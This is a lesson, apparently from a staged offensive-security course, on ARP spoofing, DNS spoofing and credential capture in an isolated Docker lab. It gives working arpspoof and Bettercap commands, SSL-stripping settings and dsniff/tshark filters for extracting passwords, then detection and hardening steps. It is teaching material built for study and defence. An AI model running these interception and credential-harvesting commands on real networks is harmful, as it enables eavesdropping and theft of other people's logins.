---
title: "MITM and ARP Spoofing Lab"
tags: [network, MITM, ARP-spoofing, DNS-spoofing, credential-capture, Ettercap,
       arpspoof, Bettercap, Wireshark, T1557, T1040, ATT&CK]
module: 04-BroadSurface-04
day: 231
related_topics:
  - ARP and Layer 2 Networking (Day 8)
  - Network Credential Extraction (Day 233)
  - SMB Relay and LLMNR Poisoning (Day 232)
  - Infrastructure Detection and Hardening (Day 244)
---

# Day 231 — MITM and ARP Spoofing Lab

> "ARP has not changed since 1982. No authentication. No verification. Every
> host on a LAN trusts every ARP reply it receives — even unsolicited ones.
> That is not a bug they forgot to fix. That is a design decision made before
> anyone imagined the LAN would be a threat surface. You inherit that decision
> every time you plug into a switch."
>
> — Ghost

---

## Goals

By the end of today's session you will be able to:

1. Explain how ARP spoofing works at the packet level and why it succeeds
   against standard Ethernet switches.
2. Execute a man-in-the-middle attack against two hosts on a lab network.
3. Perform DNS spoofing over the established MITM position to redirect traffic.
4. Capture and identify plaintext credentials passing through your position.
5. Write the detection logic that would catch your attack.

**Time budget:** 4–5 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| ARP, routing, and Layer 2 fundamentals | Day 8 |
| Wireshark capture and dissection | Day 7 |
| Linux networking commands | Days 9–16 |
| Docker networking basics | Day 188 |

---

## Part 1 — How ARP Spoofing Works (Recon)

### ARP at Layer 2

Ethernet switches forward frames by MAC address. When Host A wants to reach
Host B (same subnet), it broadcasts an ARP request: "Who has 192.168.1.2?"
Host B replies: "192.168.1.2 is at aa:bb:cc:dd:ee:ff." Host A caches this.

**The vulnerability:** Any host can send an unsolicited ARP reply. The receiving
host updates its cache without validating whether the reply was expected or
whether the sender is legitimate. This is called **gratuitous ARP**.

### The Attack

```
Before attack:
  Host A cache: 192.168.1.1 (Gateway) → mac_gateway
  Host B cache: 192.168.1.2 (Host A)  → mac_hostA

Attacker sends two gratuitous ARP replies continuously:
  → To Host A: "192.168.1.1 is at mac_attacker"
  → To Gateway: "192.168.1.2 is at mac_attacker"

After attack:
  Host A cache: 192.168.1.1 (Gateway) → mac_attacker  ← traffic now flows through attacker
  Gateway cache: 192.168.1.2 (Host A)  → mac_attacker  ← return traffic too
```

With IP forwarding enabled on the attacker machine, packets are forwarded to
their real destination — both sides see normal connectivity, but every packet
passes through the attacker.

**MITRE ATT&CK:** T1557.002 — ARP Cache Poisoning

---

## Part 2 — Lab Setup

```bash
# Create an isolated lab network
docker network create --subnet=192.168.100.0/24 mitm-lab

# Victim A — runs an HTTP service with a login form
docker run -d --name victim-a \
  --network mitm-lab --ip 192.168.100.10 \
  --hostname victim-a \
  nginx:alpine

# Victim B — simulates a gateway / FTP server
docker run -d --name victim-b \
  --network mitm-lab --ip 192.168.100.20 \
  --hostname victim-b \
  atmoz/sftp admin:password123:::upload 2>/dev/null || \
  docker run -d --name victim-b \
    --network mitm-lab --ip 192.168.100.20 \
    python:3 python3 -m http.server 8080

# Attacker — your container
docker run -it --rm \
  --name attacker \
  --network mitm-lab --ip 192.168.100.100 \
  --cap-add NET_ADMIN \
  --cap-add NET_RAW \
  kalilinux/kali-rolling bash

# Inside the attacker container:
apt-get install -y arpspoof dsniff bettercap wireshark-common tcpdump net-tools
```

---

## Part 3 — ARP Spoofing Execution

### Enable IP Forwarding

```bash
# CRITICAL: without this, you drop packets instead of forwarding them
# Both sides lose connectivity — the attack is detected immediately
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward  # confirm: 1
```

### Method 1 — arpspoof (classic, minimal)

```bash
# Terminal 1: poison victim-a's cache (tell A that victim-b's IP = our MAC)
arpspoof -i eth0 -t 192.168.100.10 192.168.100.20

# Terminal 2: poison victim-b's cache (tell B that victim-a's IP = our MAC)
arpspoof -i eth0 -t 192.168.100.20 192.168.100.10

# Terminal 3: capture the traffic
tcpdump -i eth0 -w /tmp/mitm-capture.pcap \
  host 192.168.100.10 and host 192.168.100.20
```

### Method 2 — Bettercap (modern, feature-rich)

```bash
bettercap -iface eth0

# Inside the bettercap REPL:
net.probe on
net.show

# Set MITM targets
set arp.spoof.targets 192.168.100.10,192.168.100.20
arp.spoof on

# Enable packet sniffing
net.sniff on

# Enable DNS spoofing
set dns.spoof.domains *.example.com
set dns.spoof.address 192.168.100.100
dns.spoof on

# Optional: enable HTTP proxy to inspect/modify HTTP traffic
http.proxy on
```

### Verify the Attack Worked

```bash
# From victim-a's perspective (exec into container):
docker exec victim-a arp -n
# Should show: 192.168.100.20  HWtype  ether  <attacker-mac>  C

# Check your capture is picking up traffic
tcpdump -i eth0 -n | grep -E "100\.10|100\.20"
```

---

## Part 4 — DNS Spoofing Over MITM

Once you are in the traffic path, you can intercept DNS queries and return
forged answers. The victim's browser will connect to your IP believing it is
connecting to the legitimate destination.

```bash
# In bettercap:
set dns.spoof.domains login.example.com,www.target.com
set dns.spoof.address 192.168.100.100  # your IP
dns.spoof on

# Start a simple web server on port 80 to capture credentials
# (phishing page — in a real engagement, a cloned login page)
python3 -m http.server 80 &

# Watch DNS queries being hijacked:
net.sniff on
events.stream on
```

**What happens:**
1. Victim queries DNS for `login.example.com`
2. Your DNS spoof replies: `login.example.com A 192.168.100.100`
3. Victim's browser connects to your IP thinking it is the real site
4. You serve a clone page; victim submits credentials to you

**ATT&CK:** T1557.002 (ARP Cache Poisoning) + T1584 (DNS spoofing)

---

## Part 5 — Credential Capture and Analysis

### Capture Plaintext Protocols

```bash
# Watch for credentials in real time (dsniff)
dsniff -i eth0

# dsniff decodes: FTP, Telnet, HTTP Basic Auth, IMAP, POP3, SMTP, LDAP

# Manual Wireshark filters for credential hunting:
# FTP credentials:
tshark -r /tmp/mitm-capture.pcap \
  -Y "ftp.request.command == \"PASS\"" \
  -T fields -e ftp.request.arg

# HTTP Basic Auth:
tshark -r /tmp/mitm-capture.pcap \
  -Y "http.authorization" \
  -T fields -e http.authorization

# HTTP POST bodies (login forms):
tshark -r /tmp/mitm-capture.pcap \
  -Y "http.request.method == \"POST\"" \
  -T fields -e text

# NTLM authentication (even over HTTP):
tshark -r /tmp/mitm-capture.pcap \
  -Y "ntlmssp" \
  -T fields -e ntlmssp.identifier -e ntlmssp.messagetype
```

### SSL Stripping (HTTPS → HTTP)

When a victim types `https://site.com`, their browser first makes an HTTP
request to get redirected. SSLstrip intercepts that redirect and downgrades
the connection to HTTP — the victim communicates over HTTP while your proxy
communicates over HTTPS with the server.

```bash
# In bettercap:
set https.proxy.sslstrip true
https.proxy on
http.proxy on
net.sniff on

# Limitation: modern browsers use HSTS preloading — most popular sites
# are immune. This works against internal apps, legacy systems, and
# any site not on the HSTS preload list.
```

---

## Part 6 — Detection

### What ARP Spoofing Looks Like

In a normal network:
- ARP replies are responses to requests
- Each IP has one MAC address
- MAC-IP mappings change rarely

ARP spoofing produces:
- Unsolicited ARP replies (gratuitous ARP) at a high rate
- Duplicate IP-to-MAC mappings (two hosts claiming the same IP)
- Rapid changes to ARP cache entries

### Detection Methods

**On the endpoint (Linux):**
```bash
# Watch for ARP cache changes — a rate above 1/sec is suspicious
watch -n1 'arp -n | sort'

# Log changes:
arpwatch -i eth0 -f /var/log/arpwatch.dat
```

**On the switch (hardware detection):**
- **Dynamic ARP Inspection (DAI)**: Cisco feature that validates ARP packets
  against a DHCP snooping binding table. Drops ARP replies where MAC+IP does
  not match the DHCP lease. Configured per-VLAN: `ip arp inspection vlan 10`
- **DHCP Snooping**: Required for DAI. Builds a table of
  {MAC, IP, port, VLAN, lease time} from observed DHCP transactions.

**SIEM detection (Elastic/Splunk query pattern):**
```
event.type: network AND network.type: arp
AND arp.opcode: reply
GROUP BY src.mac, arp.src.proto_ipv4
HAVING count(*) > 20 AND count(DISTINCT arp.src.proto_ipv4) > 1
```
Trigger: same source MAC claiming multiple IPs, or >20 ARP replies per minute.

### Fix

1. **Enable DAI on all access switches** — closes the ARP spoofing path entirely.
2. **Use static ARP entries** for critical hosts (gateway, DNS, auth servers).
3. **Segment the network** — ARP spoofing is Layer 2; VLANs limit the blast radius.
4. **Enforce TLS everywhere** — even if MITM succeeds, encrypted traffic is not
   useful without a TLS attack. ARP spoofing + HTTP on the same network is the
   dangerous combination.

---

## Key Takeaways

1. **ARP has no authentication.** Any host can claim any IP. The protocol was
   designed for trusted networks; LANs are not trusted networks anymore.
2. **IP forwarding is required for stealth.** Without it, you become a packet
   black hole — victims notice immediately. Always set it first.
3. **DNS spoofing amplifies MITM.** ARP spoofing alone lets you read traffic.
   DNS spoofing lets you redirect traffic to your own servers.
4. **HTTPS limits usefulness but does not eliminate it.** Unencrypted protocols
   (FTP, Telnet, HTTP, SMTP without STARTTLS) are fully exposed.
   HSTS-protected HTTPS is safe from SSLstrip; legacy apps often are not.
5. **DAI is the correct fix.** Static ARP entries are operationally painful.
   Dynamic ARP Inspection at the switch is the scalable, right answer.

---

## Exercises

1. Capture a full ARP poisoning session and open the PCAP in Wireshark.
   Apply the filter `arp.opcode == 2` (ARP replies only). How many ARP
   replies per second does your attack generate? What would a reasonable
   detection threshold be?

2. Configure arpwatch on one of the victim containers and trigger an ARP
   spoofing attack against it. What does arpwatch log? Could a defender
   distinguish a legitimate IP address change (device renewing DHCP) from
   an ARP spoofing attack using arpwatch alone?

3. Research: what is 802.1X port-based NAC and how does it interact with
   ARP spoofing? Does 802.1X prevent ARP spoofing, or only prevent
   unauthorized devices from accessing the network?

4. Write a Python script using `scapy` that sends crafted ARP replies to
   poison a single target's cache entry for the default gateway. The script
   should: (a) accept target IP and gateway IP as arguments, (b) send a
   poisoned ARP reply every 2 seconds, (c) restore the correct ARP entry
   when interrupted (Ctrl+C).

---

## Questions

> Add your questions here. Each question gets a Global ID (Q231.1, Q231.2 …).
> Follow-up questions use hierarchical numbering (Q231.1.1, Q231.1.2 …).

---

## Navigation

← Previous: [Day 230 — Mobile Security Competency Check](../04-BroadSurface-03/DAY-0230-Mobile-Competency-Check.md)
→ Next: [Day 232 — SMB Relay and LLMNR Poisoning](DAY-0232-SMB-Relay-and-LLMNR-Poisoning.md)
